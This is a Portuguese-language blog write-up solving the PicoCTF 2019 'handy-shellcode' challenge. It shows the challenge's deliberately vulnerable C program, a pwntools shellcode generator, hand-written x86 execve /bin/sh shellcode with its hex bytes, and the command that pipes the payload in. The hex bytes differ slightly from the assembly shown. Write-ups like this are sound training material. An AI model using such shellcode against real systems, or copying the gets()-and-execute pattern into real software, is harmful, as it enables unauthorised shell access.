---
layout: post
title: Writeup Handy-Shellcode
author: "Felipe Brasileiro"
date: 2020-08-15 12:00:00 -0300
lide: Nesse post temos o Writeup do primeiro desafio de Binary Exploitation do PicoCTF2019. Esse desafio envolve a execução de um shellcode com o objetivo de ler o arquivo flag.txt
---

## Reconhecimento

![apresentação](https://i.imgur.com/9HcwxVg.png)

O desafio começa nos dando o binário que devemos explorar e seu código-fonte.

Ao executar o binário, ele nos pede um shellcode.

![executavel](https://i.imgur.com/t1LKFTX.png)

Pensei em colocar qualquer coisa no input para ver como que o binário iria se comportar e, de acordo com a resposta, esse programa tenta executar o que for colocado no input.

Analisando o código-fonte eu percebi que essa hipótese estava certa, já que o valor recebido é passado na variável **`buf`** em
**`((void (*)())buf)();`** e assim é executado.

> **Código-Fonte:**
>
> ```C
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <sys/types.h>
> #define BUFSIZE 148
> #define FLAGSIZE 128
>
> void vuln(char *buf){
>  gets(buf);
>  puts(buf);
> }
>
> int main(int argc, char **argv){
>  setvbuf(stdout, NULL, _IONBF, 0);
>  // Set the gid to the effective gid
>  // this prevents /bin/sh from dropping the privileges
>  gid_t gid = getegid();
>  setresgid(gid, gid, gid);
>  char buf[BUFSIZE];
>  puts("Enter your shellcode:");
>
>  vuln(buf);
>
>  puts("Thanks! Executing now...");
>
>  ((void (*)())buf)();
>
>  puts("Finishing Executing Shellcode. Exiting now...");
>  return 0;
> }
> ```

Sendo assim, precisamos de um shellcode que, ao ser executado, leia o arquivo flag.txt ou "spawne" uma shell para em seguida lermos a flag.

## Exploração

Na aba de dicas do desafio tem escrito _"Você pode achar bons shellcodes online"_, mas existem outras formas de pegar um shellcode.

### 1. Utilizando pwntools

Uma das formas fáceis de pegar um shellcode é utilizando a biblioteca _**pwntools**_ do python como no seguinte exemplo:

```py
from pwn import *
f = open('payload1', 'wb')
f.write(asm(shellcraft.linux.sh()))
f.close()
```

Esse script vai gerar um shellcode que "spawna" a shell **/bin/sh** e o escrever no arquivo _payload1_

### 2. Criando um shellcode

Outra forma de resolver o desafio (e a mais divertida) é escrever seu próprio shellcode.
Nesse shellcode, eu utilizei a syscall **_execve_** para "spawnar" a shell e a syscall **_exit_** para terminar a execução do programa assim que fechar a shell.

```nasm
section .text
global _start:
_start:
    xor edx, edx            ; "Transforma" EDX em 0x00
    push edx                ; Empurra EDX para a Stack
    push sh                 ; Move hs// para a Stack
    push bin                ; Move nib/ para a Stack
    mov ebx, esp            ; Move ESP (/bin//sh) para EBX
    mov ecx, esp            ; Move ESP (/bin//sh) para ECX
    push edx                ; Empurra EDX (0x00) para a Stack
    push ebx                ; Empurra EBX (/bin//sh) para a Stack
    mov eax, 0x1234560c     ; Move 0x1234560c para EAX
    sub eax, 0x12345601     ; Subtrai 0x12345601 de EAX, resultando em 0xb <- Valor da syscall execve
    int 0x80                ; Chama a syscall
    xor eax, eax            ; "Transforma" EAX em 0x00
    inc eax                 ; Aumenta o valor de EAX em 0x1, resultando em 0x1 <- Valor da syscall exit
    xor ebx, ebx            ; "Transforma" EBX em 0x00
    int 0x80                ; Chama a syscall

sh: equ 0x68732f2f          ; em ascii => hs//   (//sh)
bin: equ 0x6e69622f         ; em ascii => nib/  (/bin)

```

O codigo em Assembly "gera" o seguinte shellcode:

> "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb8\x0c\x56\x34\x12\x2d\x01\x56\x34\x12\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80"

Escrevendo ele em um arquivo foi como feito com o pwntools, é possível "spawnar" a shell.

```py
shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb8\x0c\x56\x34\x12\x2d\x01\x56\x34\x12\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80"
f = open('payload', 'wb')
f.write(shellcode)
f.close()
```

## Flag

Para executar o payload e conseguir interagir com a shell é necessário manter o fluxo no stdin
e para isso é preciso executar `(cat payload1; cat) | ./vuln`.

![flag](https://i.imgur.com/2YeiRrq.png)
